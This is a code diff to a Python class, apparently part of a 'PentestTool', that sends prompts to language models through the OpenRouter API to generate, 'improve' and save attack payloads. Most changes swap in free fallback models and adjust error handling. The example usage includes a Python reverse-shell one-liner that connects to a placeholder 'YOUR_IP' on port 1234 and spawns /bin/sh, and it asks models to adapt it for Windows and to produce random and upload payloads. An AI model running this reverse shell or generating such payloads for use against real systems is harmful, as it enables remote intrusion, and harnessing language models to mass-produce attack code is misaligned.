@@ -13,10 +13,18 @@ class AIPayloadGenerator:
         self.max_retries = max_retries
         self.timeout = timeout
         self.base_url = "https://openrouter.ai/api/v1/chat/completions"
+        # Updated fallback models with currently free text models
         self.fallback_models = [
-            "anthropic/claude-3-haiku",
-            "gpt-3.5-turbo"
-        ]  # Fallback models in order of preference
+            "openrouter/hunter-alpha",
+            "openrouter/healer-alpha",
+            "nvidia/nemotron-3-super-120b-a12b:free",
+            "nvidia/llama-nemotron-embed-vl-1b-v2:free",
+            "minimax/minimax-m2.5:free",
+            "stepfun/step-3.5-flash:free",
+            "arcee-ai/trinity-large-preview:free",
+            "liquid/lfm-2.5-1.2b-thinking:free",
+            "liquid/lfm-2.5-1.2b-instruct:free"
+        ]
 
     def _get_api_key(self) -> str:
         """Safely retrieve API key with validation"""
@@ -30,7 +38,7 @@ class AIPayloadGenerator:
             "Authorization": f"Bearer {self._get_api_key()}",
             "Content-Type": "application/json",
             "HTTP-Referer": "https://example.com",
-            "X-Title": "PentestTool",
+            "X-OpenRouter-Title": "PentestTool",
         }
 
     def _build_payload_prompt(
@@ -71,19 +79,23 @@ class AIPayloadGenerator:
                 json={"model": model, "messages": messages},
                 timeout=self.timeout
             )
+            # Immediately treat 429 (rate limit) and 404 (not found) as failures
+            if response.status_code in (429, 404):
+                print(f"Model {model} returned {response.status_code}. Skipping to fallback.")
+                return None
             response.raise_for_status()
             return response.json()
 
         except (RequestException, Timeout) as e:
             if retry_count < self.max_retries:
                 wait_time = min(5, (2 ** retry_count))  # Cap at 5 seconds
-                print(f"Retry {retry_count + 1}/{self.max_retries}. Waiting {wait_time}s...")
+                print(f"Retry {retry_count + 1}/{self.max_retries} for {model}. Waiting {wait_time}s...")
                 time.sleep(wait_time)
                 return self._make_api_request(model, messages, retry_count + 1)
-            print(f"API Request Failed: {str(e)}")
-            if hasattr(e, 'response'):
-                print(f"Status Code: {getattr(e.response, 'status_code', 'N/A')}")
-                print(f"Response: {getattr(e.response, 'text', 'No response')}")
+            print(f"API Request Failed for {model}: {str(e)}")
+            if hasattr(e, 'response') and e.response is not None:
+                print(f"Status Code: {e.response.status_code}")
+                print(f"Response: {e.response.text}")
             return None
 
     def generate_payload(
@@ -91,7 +103,7 @@ class AIPayloadGenerator:
         existing_payload: Optional[str] = None,
         prompt: Optional[str] = None,
         operating_system: str = "Windows",
-        primary_model: str = "deepseek/deepseek-chat-v3-0324:free"
+        primary_model: str = "openrouter/hunter-alpha"  # Updated primary model
     ) -> Optional[str]:
         content = self._build_payload_prompt(existing_payload, prompt, operating_system)
         messages = [{"role": "user", "content": content}]
@@ -120,30 +132,30 @@ class AIPayloadGenerator:
         config = Setting()
         config.setting_var()
         if not payload:
-            print("❌ Failed to generate payload")
+            print("[!] Failed to generate payload")
             return
             
         print(f"\n{'='*50}")
-        print(f"🔧 {title}")
+        print(f"[+] {title}")
         print(f"{'='*50}\n")
         if save_payload:
-            with open(f"{config.STATIC_DIR}/{datetime.now().strftime('%Y%m%d_%H%M%S')}.py", "w") as f:
+            filename = f"{config.STATIC_DIR}/{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
+            with open(filename, "w") as f:
                 f.write(payload)
-            print(f"Payload saved to static/py/{datetime.now().strftime('%Y%m%d_%H%M%S')}.py")
+            print(f"Payload saved to {filename}")
         print(payload)
         print(f"\n{'='*50}")
-        print(f"📏 Length: {len(payload)} chars")
+        print(f"[+] Length: {len(payload)} chars")
         print(f"{'='*50}")
 
 
 # Example Usage
 if __name__ == "__main__":
-    # Initialize with default retry/timeout settings
     generator = AIPayloadGenerator(max_retries=3, timeout=20)
 
     # Example 1: Payload modification
     modified_payload = generator.generate_payload(
-        existing_payload = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('YOUR_IP',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);",
+        existing_payload="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('YOUR_IP',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);",
         prompt="Improve the payload for Windows",
         operating_system="Windows"
     )
@@ -155,6 +167,7 @@ if __name__ == "__main__":
         operating_system="windows",
     )
     generator.print_payload(upload_payload, "UPLOAD PAYLOAD", save_payload=True)
+
     # Example 3: Random payloads
     random_payloads = generator.generate_payload(operating_system="Windows")
     generator.print_payload(random_payloads, "RANDOM PAYLOADS", save_payload=True)
